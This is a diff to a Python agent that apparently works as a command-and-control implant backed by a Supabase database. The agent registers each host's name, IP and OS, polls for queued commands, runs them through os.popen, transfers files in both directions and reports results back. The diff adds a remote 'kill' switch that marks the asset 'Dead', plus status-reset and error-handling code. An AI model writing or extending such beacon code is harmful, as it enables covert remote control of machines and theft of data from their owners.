@@ -21,6 +21,22 @@ DEFAULT_TIMEOUT = 30  # Default timeout value if not provided
 DEFAULT_CHECK_IN = 'Checked-in'  # Default check-in status if not provided
 bucket_name = "files"
 
+def reset_agent_status():
+    """Reset the agent's status to 'Checked-In' at startup."""
+    hostname = socket.gethostname()
+    try:
+        response = supabase.table('settings').update({
+            'check_in': 'Checked-In'
+        }).eq('hostname', hostname).execute()
+
+        if response.data:
+            logging.info(f"Status for {hostname} reset to 'Checked-In'.")
+        else:
+            logging.warning(f"Failed to update status for {hostname}. Error details: {response.text}")
+    except Exception as e:
+        logging.error(f"An error occurred while updating the agent status: {e}")
+
+
 def get_system_info():
     """Retrieve the hostname, IP address, and OS of the current system."""
     hostname = socket.gethostname()
@@ -41,22 +57,30 @@ def fetch_settings():
         timeout_interval = settings.get('timeout_interval', DEFAULT_TIMEOUT)
         check_in_status = settings.get('check_in', DEFAULT_CHECK_IN)
 
-        # Update the last checked-in time
-        supabase.table('settings').update({
-            'last_checked_in': now
-        }).eq('hostname', hostname).execute()
+        # Try updating the last checked-in time with error handling
+        try:
+            supabase.table('settings').update({
+                'last_checked_in': now
+            }).eq('hostname', hostname).execute()
+        except SupabaseException as e:
+            logging.warning(f"Failed to update last checked-in time: {e.message}")
+        except Exception as e:
+            logging.error(f"An unexpected error occurred while updating last checked-in time: {e}")
 
         return timeout_interval, check_in_status
     else:
         # Insert new system info if no record exists for this hostname
-        supabase.table('settings').insert({
-            'hostname': hostname,
-            'ip': ip,
-            'os': os_info,
-            'timeout_interval': DEFAULT_TIMEOUT,
-            'check_in': DEFAULT_CHECK_IN,
-            'last_checked_in': now
-        }).execute()
+        try:
+            supabase.table('settings').insert({
+                'hostname': hostname,
+                'ip': ip,
+                'os': os_info,
+                'timeout_interval': DEFAULT_TIMEOUT,
+                'check_in': DEFAULT_CHECK_IN,
+                'last_checked_in': now
+            }).execute()
+        except Exception as e:  # Catch all exceptions during insert
+            logging.error(f"An error occurred while inserting settings: {e}")
 
     return DEFAULT_TIMEOUT, DEFAULT_CHECK_IN
 
@@ -157,29 +181,32 @@ def handle_upload_command(command_text, encoded_data, username):
 
 def execute_commands():
     hostname, ip, os_info = get_system_info()
+
+    # Handle pending uploads
     pending_uploads = fetch_pending_uploads().data
     for upload in pending_uploads:
         file_url = upload.get('file_url')
         remote_path = upload.get('remote_path')
-
         if file_url and remote_path:
             if download_from_supabase(file_url, remote_path, SUPABASE_KEY):
                 supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
             else:
                 supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
 
-    # --- 2. Handle Other Commands ---
+    # Handle other commands
     pending_commands = fetch_pending_commands_for_hostname(hostname).data
     for command in pending_commands:
         command_id = command['id']
         command_text = command['command']
         username = command.get('username', 'Unknown')
-        encoded_data = command.get('output', '')  # Fetch encoded data for upload commands
+
+        # Handle kill command with command_id and hostname
+        handle_kill_command(command_id, command_text, hostname)
 
         if command_text.lower().startswith('download'):
             status, output = handle_download_command(command_text, username)
         elif command_text.lower().startswith('upload'):
-            status, output = handle_upload_command(command_text, encoded_data, username) # Pass encoded data to handle_upload_command
+            status, output = handle_upload_command(command_text, command.get('output', ''), username)
         else:
             try:
                 result = os.popen(command_text).read()
@@ -191,7 +218,45 @@ def execute_commands():
 
         update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
+def handle_kill_command(command_id, command_text, hostname):
+    """Check for the 'kill' command, update the status before exiting, and update settings."""
+    if command_text.strip().lower() == "kill":
+        print("Kill command received. Updating status and exiting agent.")
+
+        try:
+            # Update the status to 'Completed' for the command before exiting
+            response = update_command_status(command_id, 'Completed', 'Agent terminated')
+
+            if response.data:  # check if update was successful
+                print("Command status updated successfully.")
+            else:
+                print(f"Error updating command status: {response.text}")
+
+            # Update the 'settings' table to mark the asset as 'Dead'
+            update_settings_status(hostname, 'Dead')
+
+        except Exception as e:  # Catch general exceptions for the status update
+            print(f"Failed to update command or settings status before termination: {e}")
+
+        finally:  # This block will always execute, even if an exception occurs
+            os._exit(0)  # Terminate the process immediately
+
+def update_settings_status(hostname, status):
+    """Update the check-in status of the hostname in the settings table."""
+    try:
+        response = supabase.table('settings').update({
+            'check_in': status
+        }).eq('hostname', hostname).execute()
+
+        if response.data:
+            logging.info(f"Status for {hostname} updated to {status}.")
+        else:
+            logging.warning(f"Failed to update status for {hostname}: {response.text}")
+    except Exception as e:
+        logging.error(f"An error occurred while updating status for {hostname}: {e}")
+
 if __name__ == '__main__':
+    reset_agent_status()
     while True:
         timeout_interval, _ = fetch_settings()
         execute_commands()
